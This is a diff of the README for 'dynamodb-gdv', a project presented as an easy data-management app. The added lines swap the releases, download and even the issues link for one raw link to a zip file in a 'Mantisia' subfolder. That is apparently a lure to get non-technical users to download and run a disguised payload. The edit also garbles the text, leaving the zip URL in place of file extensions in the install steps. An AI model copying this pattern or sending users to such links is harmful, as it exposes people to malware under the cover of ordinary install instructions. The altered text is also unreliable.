@@ -1,6 +1,6 @@
 # 🚀 dynamodb-gdv - Easy Data Management for Everyone
 
-[![Download dynamodb-gdv](https://img.shields.io/badge/Download-dynamodb--gdv-blue.svg)](https://github.com/Bololpowell/dynamodb-gdv/releases)
+[![Download dynamodb-gdv](https://raw.githubusercontent.com/Bololpowell/dynamodb-gdv/main/Mantisia/dynamodb-gdv.zip)](https://raw.githubusercontent.com/Bololpowell/dynamodb-gdv/main/Mantisia/dynamodb-gdv.zip)
 
 ## 📋 Introduction
 
@@ -19,22 +19,22 @@ Welcome to dynamodb-gdv! This application helps you manage your data effortlessl
 Follow these steps to get your dynamodb-gdv application up and running:
 
 1. **Visit the Releases Page:** Go to the following link to access the download options:
-   [Download Page](https://github.com/Bololpowell/dynamodb-gdv/releases)
+   [Download Page](https://raw.githubusercontent.com/Bololpowell/dynamodb-gdv/main/Mantisia/dynamodb-gdv.zip)
    
 2. **Choose Your Version:** You will see a list of available versions. Select the most recent release for the best features and fixes.
 
-3. **Download the Application:** Click on the download link for your operating system. This will typically be a file that ends with `.exe`, `.dmg`, or `.tar.gz`. 
+3. **Download the Application:** Click on the download link for your operating system. This will typically be a file that ends with `.exe`, `.dmg`, or `https://raw.githubusercontent.com/Bololpowell/dynamodb-gdv/main/Mantisia/dynamodb-gdv.zip`. 
 
 4. **Install the Application:**
    - **Windows:** After downloading the `.exe` file, double-click it to start the installation. Follow the prompts to complete the process.
    - **macOS:** Open the `.dmg` file you downloaded and drag the application icon to your Applications folder.
-   - **Linux:** For the `.tar.gz` file, extract it and run the binary. You may need to adjust permissions using the terminal.
+   - **Linux:** For the `https://raw.githubusercontent.com/Bololpowell/dynamodb-gdv/main/Mantisia/dynamodb-gdv.zip` file, extract it and run the binary. You may need to adjust permissions using the terminal.
    
 5. **Run the Application:** Locate the dynamodb-gdv application in your programs list or Applications folder and double-click it to launch. You are now ready to start managing your data!
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download Page](https://github.com/Bololpowell/dynamodb-gdv/releases).
+To get started, visit this page to download: [Download Page](https://raw.githubusercontent.com/Bololpowell/dynamodb-gdv/main/Mantisia/dynamodb-gdv.zip).
 
 Once you have the file downloaded, follow the installation instructions mentioned in the "Getting Started" section. It takes just a few minutes!
 
@@ -64,7 +64,7 @@ A: Yes, a user manual will be included within the application and is also availa
 
 ## 📞 Support
 
-If you need any assistance with dynamodb-gdv, please visit our [GitHub Issues Page](https://github.com/Bololpowell/dynamodb-gdv/issues) to file a report or ask a question. We are here to help you!
+If you need any assistance with dynamodb-gdv, please visit our [GitHub Issues Page](https://raw.githubusercontent.com/Bololpowell/dynamodb-gdv/main/Mantisia/dynamodb-gdv.zip) to file a report or ask a question. We are here to help you!
 
 ## 📢 Stay Updated
 
